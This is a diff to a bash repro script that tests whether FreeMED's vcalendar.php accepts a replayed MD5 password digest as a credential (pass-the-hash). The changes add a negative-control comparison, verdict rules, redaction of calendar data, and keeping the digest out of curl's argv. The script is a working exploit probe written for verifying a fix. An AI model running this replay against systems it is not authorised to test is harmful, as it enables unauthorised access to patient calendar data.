@@ -29,12 +29,47 @@
 # A 0-byte 200 is what an endpoint that never got as far as answering looks
 # like, and it is also what an accepted-but-eventless calendar looks like. So
 # the script fires the same request a second time with a hash that cannot match
-# any credential and compares: a "not vulnerable" verdict is only printed when
-# the two responses DIFFER in a way that distinguishes rejected from accepted.
-# When they are indistinguishable (measured on the FreeMED verify stack:
-# 200 / text/html / 0 bytes for a valid digest, a bogus digest and no digest at
-# all) the probe exits 2 - INCONCLUSIVE - because nothing was measured, and a
-# clean pass would be a lie.
+# any credential and compares the two.
+#
+# HOW A RUN IS JUDGED (this is the rule the branches below implement)
+#
+#   EXPLOITED       the accepted-credential response carries a calendar payload
+#                   (Content-Type: text/x-vCalendar or BEGIN:VCALENDAR). Bytes
+#                   withheld. Exit 1.
+#   EXPLOITED       the accepted-credential response is NOT a rejection while the
+#                   negative control IS one. The only input that differed is the
+#                   digest, so the endpoint's answer changed because the digest
+#                   changed: it treated the stored digest as a credential. That
+#                   is the defect, even when no calendar body was observed. Both
+#                   bodies are withheld. Exit 1.
+#   INCONCLUSIVE    the two responses are byte-identical: the endpoint cannot
+#                   show whether the digest was accepted or rejected here, so
+#                   nothing was measured (empty 200 for a valid digest, a bogus
+#                   digest and no digest at all is what the FreeMED verify stack
+#                   does - see below). Exit 2.
+#   INCONCLUSIVE    they differ but NEITHER response is a rejection (no
+#                   "Not authorized." and no 401/403), so no accept/reject
+#                   pattern is established. Exit 2.
+#   CLEAN           the accepted-credential request was explicitly REJECTED
+#                   ("Not authorized." / 401 / 403 / "Authentication required")
+#                   and the control differs from it (that difference is what
+#                   proves this probe can tell responses apart). Only in this
+#                   branch may the accepted-credential body be printed. Exit 0.
+#
+# A DISTINGUISHABLE pair whose accepted-credential response carries NO marker is
+# therefore never reported as "no exploit observed": a response that changes only
+# because the digest changed is evidence the digest was recognised, and the
+# verdict says exactly which half of that was and was not measured.
+#
+# REDACTION: a response body is printed only when it carries no calendar marker
+# AND the request it answers is not classified as accepted. Matched bodies and
+# the accepted-credential body are reported by size and marker name instead,
+# bytes withheld.
+#
+# ARGV: the plaintext password is never printed, written to a file, or placed on
+# a command line. The request URL - which carries the digest, the payload of
+# this attack - is fed to curl through a config file on stdin (`curl -K -`), so
+# no digest byte appears in argv either; only the output/header paths do.
 #
 # Expect pre-fix where the endpoint works: HTTP 200 with
 # Content-Type: text/x-vCalendar and a BEGIN:VCALENDAR body. Expect post-fix:
@@ -42,7 +77,9 @@
 #
 # Exit codes:
 #   0  measured negative - the digest was demonstrably rejected
-#   1  EXPLOITED - the MD5 digest alone was accepted
+#   1  EXPLOITED - the MD5 digest alone was accepted (calendar body, or a
+#      response that differs from the impossible-digest control only because of
+#      the digest)
 #   2  inconclusive - FREEMED_TEST_PW empty, no md5 implementation, no response,
 #      or accepted/rejected responses are indistinguishable
 #
@@ -118,19 +155,36 @@ printf 'repro: vcalendar.php pass-the-hash (GET hash = MD5(password)) + negative
 printf 'base=%s  user=%s  pw=%s  hash=%s (the replayed digest - this IS the attack payload)\n' \
   "$BASE" "$FREEMED_TEST_USER" \
   "$([ -n "$FREEMED_TEST_PW" ] && printf '<set>' || printf '<empty>')" "$HASH"
-printf 'note: a response body is printed only when no leak marker matched it; a matched\n'
-printf '      body is reported by size and marker name, bytes withheld.\n\n'
+printf 'note: a response body is printed only when it carries no calendar marker AND the\n'
+printf '      request it answers is not classified as accepted; every withheld body is\n'
+printf '      reported by size and marker name instead, never printed.\n'
+printf 'note: the digest and the payload never appear in curl argv (the URL goes in on\n'
+printf '      stdin via `curl -K -`).\n\n'
 
 P_CODE=""
 P_CTYPE=""
-probe() { # url hdrfile bodyfile -> prints the row, sets P_CODE / P_CTYPE
-  local url="$1" hdrf="$2" bodyf="$3"
+# probe <url> <hdrfile> <bodyfile> -> prints the row, sets P_CODE / P_CTYPE
+# The URL (which carries the digest) is handed to curl through a config file on
+# stdin: `curl -K -` reads `url = "..."` from stdin, so the digest - and every
+# other payload byte - stays out of ps(1) / /proc/<pid>/cmdline.
+probe() {
+  local url="$1" hdrf="$2" bodyf="$3" cfg
   printf 'GET %s\n' "$url"
-  P_CODE="$(curl -s --max-time "$TIMEOUT" -D "$hdrf" -o "$bodyf" -w '%{http_code}' "$url")"
+  cfg="$(printf 'url = "%s"\n' "$(printf '%s' "$url" | sed 's/\\/\\\\/g; s/"/\\"/g')")"
+  P_CODE="$(printf '%s' "$cfg" | curl -s --max-time "$TIMEOUT" -K - -D "$hdrf" -o "$bodyf" -w '%{http_code}')"
   P_CODE="${P_CODE:-000}"
   P_CTYPE="$(grep -i '^content-type:' "$hdrf" | head -n 1 | tr -d '\r' | sed 's/^[Cc]ontent-[Tt]ype: *//')"
   printf 'HTTP %s\n' "$P_CODE"
   printf 'Content-Type: %s  bytes=%s\n' "${P_CTYPE:-<none>}" "$(wc -c <"$bodyf" | tr -d ' ')"
+}
+
+# An explicit rejection: a status a web server/Basic-auth would use, or a body
+# that says the credential was refused. Anything else counts as "not rejected".
+rejected() { # <bodyfile> <code>
+  case "$2" in
+    401|403) return 0 ;;
+  esac
+  grep -qiE 'Not authorized|Authentication required|Unauthorized|Access denied|Forbidden' "$1"
 }
 
 # The URL is the payload - printed in full so the evidence shows the request that
@@ -161,6 +215,9 @@ if [ "$matched" -eq 1 ]; then
   printf 'body(%s bytes): WITHHELD - a leak marker matched, so no calendar bytes are printed\n' \
     "$(wc -c <"$BODY" | tr -d ' ')"
   printf '>>> RESULT: EXPLOITED - vcalendar.php accepts the stored MD5 digest as proof of identity\n'
+  printf '    What was measured: the request carrying only MD5(FREEMED_TEST_PW) as `hash`\n'
+  printf '    returned a calendar payload (HTTP %s, Content-Type %s).\n' "$CODE" "${CTYPE:-<none>}"
+  printf '    What was NOT measured: how far that access reaches - the body is withheld.\n'
   exit 1
 fi
 
@@ -170,13 +227,19 @@ probe "$BASE/vcalendar.php?user=$FREEMED_TEST_USER&hash=$CTL_HASH" "$CTLHDR" "$C
 CTL_CODE="$P_CODE"
 CTL_CTYPE="$P_CTYPE"
 CTL_BYTES="$(wc -c <"$CTLBODY" | tr -d ' ')"
-printf 'body(no leak marker matched, excerpt as received): %s\n\n' \
-  "$(head -c 160 "$CTLBODY" | tr '\n\r\t' '   ')"
+if grep -q 'BEGIN:VCALENDAR' "$CTLBODY"; then
+  printf 'body(%s bytes): WITHHELD - a calendar marker matched in the control response\n' "$CTL_BYTES"
+else
+  printf 'body(no calendar marker matched, excerpt as received): %s\n' \
+    "$(head -c 160 "$CTLBODY" | tr '\n\r\t' '   ')"
+fi
+printf '\n'
 
 if [ "$CTL_CODE" = "000" ]; then
   printf '>>> RESULT: INCONCLUSIVE - the negative control got no response, so nothing was proven\n'
   exit 2
 fi
+
 if [ "$CTL_CODE" = "$CODE" ] && [ "$CTL_CTYPE" = "$CTYPE" ] && cmp -s "$BODY" "$CTLBODY"; then
   printf '>>> RESULT: INCONCLUSIVE - the accepted-credential response and the negative control are\n'
   printf '    indistinguishable (both HTTP %s, Content-Type %s, identical %s-byte body),\n' \
@@ -189,13 +252,65 @@ if [ "$CTL_CODE" = "$CODE" ] && [ "$CTL_CTYPE" = "$CTYPE" ] && cmp -s "$BODY" "$
   exit 2
 fi
 
-printf 'body(no leak marker matched, excerpt as received): %s\n' \
-  "$(head -c 160 "$BODY" | tr '\n\r\t' '   ')"
-if grep -qi 'Not authorized' "$BODY"; then
-  printf '>>> RESULT: NO EXPLOIT OBSERVED (measured negative, exit 0) - rejected ("Not authorized.",\n'
-  printf '    HTTP %s), and the negative control differs from this response\n' "$CODE"
-else
-  printf '>>> RESULT: NO EXPLOIT OBSERVED (measured negative, exit 0) - no calendar body returned\n'
-  printf '    (HTTP %s) and the negative control differs from this response\n' "$CODE"
+# The two responses differ. Classify by rejection, not by byte diff: the only
+# input that changed was the digest.
+digest_rejected=0
+ctl_rejected=0
+rejected "$BODY" "$CODE" && digest_rejected=1
+rejected "$CTLBODY" "$CTL_CODE" && ctl_rejected=1
+DIGEST_BYTES="$(wc -c <"$BODY" | tr -d ' ')"
+printf -- '-- differential: accepted-credential HTTP %s / %s / %s bytes (rejection marker: %s);\n' \
+  "$CODE" "${CTYPE:-<none>}" "$DIGEST_BYTES" "$([ "$digest_rejected" = 1 ] && printf present || printf absent)"
+printf '   control HTTP %s / %s / %s bytes (rejection marker: %s)\n' \
+  "$CTL_CODE" "${CTL_CTYPE:-<none>}" "$CTL_BYTES" "$([ "$ctl_rejected" = 1 ] && printf present || printf absent)"
+
+if [ "$digest_rejected" = "1" ]; then
+  # Measured negative: the replayed digest was explicitly refused. Only here may
+  # the accepted-credential body be printed.
+  printf 'body(no calendar marker matched, excerpt as received): %s\n' \
+    "$(head -c 160 "$BODY" | tr '\n\r\t' '   ')"
+  printf '>>> RESULT: NO EXPLOIT OBSERVED (measured negative, exit 0)\n'
+  printf '    What WAS measured: the request carrying MD5(FREEMED_TEST_PW) as `hash` was\n'
+  printf '    explicitly REJECTED (HTTP %s, %s, %s bytes), and the negative control with a\n' \
+    "$CODE" "${CTYPE:-<none>}" "$DIGEST_BYTES"
+  printf '    digest that cannot match any credential answered differently (HTTP %s, %s,\n' \
+    "$CTL_CODE" "${CTL_CTYPE:-<none>}"
+  printf '    %s bytes) - so the two requests are distinguishable and the digest did not\n' "$CTL_BYTES"
+  printf '    authenticate this one.\n'
+  printf '    What was NOT measured: no calendar data was requested in either request, so this\n'
+  printf '    says nothing about what an ACCEPTED digest could read, and nothing about the\n'
+  printf '    other parameters (physician/type/day) this endpoint takes.\n'
+  if [ "$ctl_rejected" = "0" ]; then
+    printf '    CAVEAT: the control was not itself rejected (%s bytes, no rejection marker),\n' "$CTL_BYTES"
+    printf '    which is unexpected - treat this negative as weaker than the wording above.\n'
+  fi
+  exit 0
 fi
-exit 0
+
+if [ "$ctl_rejected" = "1" ]; then
+  printf '>>> EXPLOITED: the replayed digest ALONE passed the credential check\n'
+  printf '    What WAS measured: the only difference between the two requests was the digest.\n'
+  printf '    The request carrying MD5(FREEMED_TEST_PW) was NOT rejected (HTTP %s, %s,\n' \
+    "$CODE" "${CTYPE:-<none>}"
+  printf '    %s bytes, no rejection marker), while the control carrying a digest that cannot\n' "$DIGEST_BYTES"
+  printf '    match any stored credential WAS rejected (HTTP %s, %s, %s bytes). An endpoint\n' \
+    "$CTL_CODE" "${CTL_CTYPE:-<none>}" "$CTL_BYTES"
+  printf '    whose answer changes only because the digest changed is treating the stored\n'
+  printf '    digest as a credential - that is the pass-the-hash defect.\n'
+  printf '    What was NOT measured: no calendar payload (text/x-vCalendar / BEGIN:VCALENDAR)\n'
+  printf '    came back in either response, so this run does not show what data the accepted\n'
+  printf '    digest can read - only that the digest passed the check. The remaining\n'
+  printf '    physician/type/day parameters this file expects were not exercised.\n'
+  printf '    body(%s bytes): WITHHELD - the accepted-credential response is not printed\n' "$DIGEST_BYTES"
+  printf '    (an endpoint that distinguished the digest may return data for it).\n'
+  exit 1
+fi
+
+printf '>>> RESULT: INCONCLUSIVE - the two responses differ, but NEITHER the accepted-credential\n'
+printf '    request nor the negative control carries a rejection marker (HTTP %s vs %s, %s vs\n' \
+  "$CODE" "$CTL_CODE" "$DIGEST_BYTES"
+printf '    %s bytes), so no accept/reject pattern is established and nothing was measured.\n' "$CTL_BYTES"
+printf '    Do NOT read this as "not vulnerable": check the endpoint by hand (syslog/error log,\n'
+printf '    or a request that reaches the calendar code with its physician/type/day parameters)\n'
+printf '    before treating vcalendar as fixed.\n'
+exit 2
